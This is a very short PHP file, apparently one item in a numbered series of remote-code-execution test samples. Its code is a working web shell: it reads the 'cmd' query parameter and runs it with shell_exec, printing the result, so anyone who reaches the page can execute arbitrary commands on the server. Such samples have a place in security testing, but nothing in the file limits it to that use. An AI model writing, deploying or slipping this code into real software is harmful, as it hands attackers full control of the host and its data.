<?php
// RCE test variation #785
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>